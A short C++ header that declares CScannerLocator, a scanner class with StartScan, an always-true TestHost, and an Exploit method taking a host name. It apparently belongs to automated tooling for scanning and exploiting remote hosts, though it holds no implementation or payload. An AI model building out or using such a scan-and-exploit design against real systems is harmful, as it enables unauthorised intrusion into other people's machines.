
#ifndef __LOCSCANNER_H__
#define __LOCSCANNER_H__

#include "cstring.h"
#include "scanner.h"

class CScannerLocator : public CScannerBase
{
public:
	CScannerLocator();
	virtual ~CScannerLocator() throw() { }
	virtual void StartScan(const CString &sHost);
	virtual bool TestHost(const CString &sHost) { return true; }

	bool Exploit(const CString &sHost);
};

#endif // __LOCSCANNER_H__
